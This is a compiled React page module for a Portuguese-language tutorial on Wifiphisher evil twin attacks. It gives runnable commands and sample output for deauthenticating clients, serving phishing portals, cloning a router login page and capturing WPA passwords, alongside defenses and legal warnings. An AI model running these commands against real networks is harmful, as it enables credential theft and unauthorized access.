import{j as e}from"./index-CAFCz3B4.js";import{P as r}from"./PageContainer-CxmWgrx_.js";import{A as i}from"./AlertBox-Dze8I6Zt.js";import{C as t}from"./CodeBlock-C6bWIuPM.js";import{C as o}from"./CommandTable-CZCYoWRB.js";import{T as a,P as n}from"./PracticeBox-BDRu97pg.js";function l(){return e.jsxs(r,{title:"Wifiphisher — Evil Twin + Phishing WiFi",subtitle:"Sobe AP falso idêntico ao real, força clientes a se associarem e mostra captive portal de phishing.",difficulty:"intermediario",timeToRead:"13 min",children:[e.jsx("h2",{children:"Como funciona"}),e.jsx("p",{children:"Em vez de tentar quebrar a senha (impossível em WPA2 com senha forte), o Wifiphisher:"}),e.jsxs("ol",{children:[e.jsxs("li",{children:["Faz ",e.jsx("strong",{children:"deauth"})," dos clientes do AP real."]}),e.jsxs("li",{children:["Sobe um AP falso (",e.jsx("strong",{children:"evil twin"}),") com o MESMO ESSID."]}),e.jsx("li",{children:'Cliente reconecta no AP falso (não tem senha — ele "cai").'}),e.jsxs("li",{children:["Toda navegação cai num ",e.jsx("strong",{children:"captive portal"})," (igual de hotel)."]}),e.jsx("li",{children:'O portal é phishing convincente: "Atualização do firmware", "Patch de segurança", "Reinsira a senha do WiFi".'}),e.jsx("li",{children:"Cliente digita a senha → você captura."})]}),e.jsx("h2",{children:"Requisitos"}),e.jsx(o,{title:"Hardware necessário",variations:[{cmd:"1 placa monitor mode",desc:"Para deauth do AP real.",output:"Alfa AWUS036NHA, TL-WN722N v1."},{cmd:"1 placa AP-mode",desc:"Para subir evil twin.",output:"Alfa AWUS036ACH, AWUS036NEH."},{cmd:"(opcional) 3a placa",desc:"Para internet upstream (NAT do alvo).",output:"Senão funciona offline."}]}),e.jsx(a,{path:"~",lines:[{cmd:"sudo apt install -y wifiphisher",out:"(também pode-se git clone https://github.com/wifiphisher/wifiphisher)",outType:"muted"},{cmd:"wifiphisher --help | head -10",out:`usage: wifiphisher [-h] [-i INTERFACE] [-eI EXTENSIONSINTERFACE] [-aI APINTERFACE] [-iI INTERNETINTERFACE]
                   [-pK PRESHAREDKEY] [-hC HANDSHAKE_CAPTURE] [-dE DEAUTH_ESSID]
                   [--essid ESSID] [-eAP] [-pE PHISHINGSCENARIO] [...]`,outType:"info"}]}),e.jsx("h2",{children:"Cenários de phishing prontos"}),e.jsx(o,{title:"--phishingscenario / -p",variations:[{cmd:"firmware-upgrade",desc:"'Roteador requer atualização. Reinsira sua chave WPA.'",output:"Funciona 99% das vezes."},{cmd:"oauth-login",desc:"'Faça login com Google/Facebook para acessar WiFi grátis.'",output:"Captura cred social."},{cmd:"wifi_connect",desc:"'A rede precisa de reautenticação.'",output:"Captura senha WPA."},{cmd:"plugin_update",desc:"'Update obrigatório do navegador.'",output:"Pode entregar payload."},{cmd:"captive_portal",desc:"Genérico de hotel/cafeteria.",output:"Boa para alvos públicos."}]}),e.jsx("h2",{children:"Ataque típico — firmware-upgrade"}),e.jsx(a,{path:"~",lines:[{cmd:"sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade",out:`[*] Starting Wifiphisher 1.4 ( https://wifiphisher.org ) at 2026-04-03 16:42

[+] Selecting wfphshr-wlan0 interface for the deauthentication attack
[+] Selecting wlan1 interface for creating the rogue Access Point
[+] Changing wlan1 MAC addr (BSSID) to 00:00:00:42:42:42
[+] Changing wfphshr-wlan0 MAC addr (BSSID) to 00:00:00:99:99:99

[+] Sending SIGKILL to wpa_supplicant
[+] Sending SIGKILL to NetworkManager

ESSID                  ENCRYPTION  POWER  CHANNEL  CLIENTS
HomeWifi               WPA/WPA2    -31    6        1
Vivo-2024              WPA/WPA2    -52    11       0
CompanyAP              WPA3/SAE    -67    1        0

[+] Choose the [num] of the AP you wish to copy: 1

[*] Starting the fake access point on channel 6 with ESSID "HomeWifi"
[*] Starting the deauth attack against AP 24:5E:BE:1A:2C:01

[+] Cliente AA:11:22:33:44:55 conectou ao evil twin
[+] DHCP ACK enviado, cliente recebeu IP 10.0.0.42

[*] HTTP request: GET / from 10.0.0.42
[*] Redirecionando para http://10.0.0.1/firmware-upgrade

[!] CREDS CAPTURED:
    SSID:     HomeWifi
    PSK:      Senha@2024
    Source:   firmware-upgrade.html (10.0.0.42)`,outType:"error"}]}),e.jsx("h2",{children:"Anatomia do template"}),e.jsx(a,{path:"~",lines:[{cmd:"ls /usr/share/wifiphisher/phishing-pages/",out:"firmware-upgrade/    oauth-login/    plugin_update/    wifi_connect/    captive_portal/",outType:"info"},{cmd:"tree /usr/share/wifiphisher/phishing-pages/firmware-upgrade -L 2",out:`firmware-upgrade/
├── config.ini
└── html/
    ├── index.html
    ├── login.html
    ├── static/
    │   ├── jquery.min.js
    │   └── style.css
    └── upgrade.html`,outType:"default"},{cmd:"cat /usr/share/wifiphisher/phishing-pages/firmware-upgrade/config.ini",out:`[info]
Name: Firmware Upgrade Page
Description: A router configuration page without logos or brands asking for WPA/WPA2 password
PayloadPath: /upgrade.bin
Version: 2

[context]
target_ap_vendor: Linksys
target_ap_logo_path: static/logo.png

[extra]
get_ssid: True
captures_credentials: True`,outType:"muted"}]}),e.jsx("h2",{children:"Customizar — clonar visual de roteador específico"}),e.jsx(a,{path:"~",lines:[{comment:"1) baixar a página real do roteador alvo (modelo Vivo, TP-Link, etc.)",cmd:"wget --mirror -E -k -p http://192.168.0.1/login.html -P /tmp/router-clone",out:"(salva HTML+CSS+imagens da pagina admin do roteador real)",outType:"info"},{cmd:"cp -r /usr/share/wifiphisher/phishing-pages/firmware-upgrade /usr/share/wifiphisher/phishing-pages/vivo-update",out:"",outType:"muted"},{comment:"2) substituir HTML pelo do roteador real",cmd:"cp /tmp/router-clone/login.html /usr/share/wifiphisher/phishing-pages/vivo-update/html/index.html",out:"(silencioso. agora visualmente é IDÊNTICO ao roteador da Vivo)",outType:"default"},{comment:"3) editar config.ini para captura",cmd:"nano /usr/share/wifiphisher/phishing-pages/vivo-update/config.ini",out:"(definir Name, Description, ApVendor)",outType:"muted"},{cmd:"sudo wifiphisher -p vivo-update",out:"(usa o template clonado)",outType:"warning"}]}),e.jsx("h2",{children:"WPS / handshake captura ao mesmo tempo"}),e.jsx(a,{path:"~",lines:[{comment:"validar a senha capturada contra handshake real (evita digitação errada)",cmd:"sudo wifiphisher --essid 'HomeWifi' --handshake-capture handshake-01.cap -p firmware-upgrade",out:`[*] Wifiphisher will deauth + bring up evil twin
[*] When user submits PSK, validate against captured handshake
[+] Cliente submeteu: 'Senha@2024'
[+] Verificando contra handshake...
[+] PSK VÁLIDA — credencial confirmada`,outType:"success"}]}),e.jsx("h2",{children:"Defesa"}),e.jsx(t,{language:"bash",title:"proteções contra evil twin",code:`# 1. WPA3 SAE — bloqueia evil twin (autenticação mútua)
# Configure roteador para WPA3 only

# 2. 802.11w (Management Frame Protection)
# Configura no roteador (PMF: Required)
# bloqueia deauth não autenticado

# 3. Cliente: VPN obrigatório
# mesmo se cair em evil twin, tráfego cifrado de ponta a ponta

# 4. Cliente: NÃO digite senha em popup que aparece "do nada"
# treinamento de awareness

# 5. Detecção: Kismet + alertas em mudança de BSSID/canal do mesmo ESSID
sudo kismet -c wlan0mon
# alertas em SSID duplicado com BSSID diferente`}),e.jsx(n,{title:"Lab pessoal — só com seu próprio WiFi",goal:"Subir evil twin do seu próprio roteador (com seu smartphone como vítima) para ENTENDER a técnica.",steps:["Tenha 2 placas WiFi USB.","Configure ambiente: airmon-ng start em ambas.","Rode wifiphisher com -p firmware-upgrade.","Selecione SEU AP no menu.","Veja o seu smartphone DESCONECTAR e cair no portal.","Digite a senha real (ou qualquer coisa).","Veja a senha aparecer no terminal do atacante.","Pare o ataque (Ctrl+C) → networkManager volta."],command:`# Confira que tem 2 placas
iw dev | grep Interface

sudo airmon-ng check kill
sudo wifiphisher -aI wlan1 -eI wlan0 -p firmware-upgrade
# selecione seu AP no menu interativo
# observe smartphone caindo no portal`,expected:`[+] Cliente <seu_smartphone_MAC> conectou ao evil twin
[+] HTTP request: GET / from 10.0.0.X
[!] CREDS CAPTURED:
    SSID: <seu_AP>
    PSK:  <oque_voce_digitou>`,verify:"Após o experimento, restart NetworkManager: sudo systemctl restart NetworkManager."}),e.jsx(i,{type:"danger",title:"Engenharia social funciona melhor que cripto",children:"Wifiphisher prova que um humano cansado clica e digita em qualquer coisa que pareça legítima. Por isso o vetor #1 de comprometimento corporativo continua sendo phishing — nenhuma criptografia no mundo protege contra um usuário que voluntariamente entrega a senha."}),e.jsx(i,{type:"danger",title:"Em rede que não é sua = crime grave",children:"Subir evil twin contra rede de terceiros é fraude eletrônica + interceptação + acesso não autorizado. Crime federal em quase todo lugar. Use só na sua rede, ambiente fechado de lab ou com contrato de red team."})]})}export{l as default};
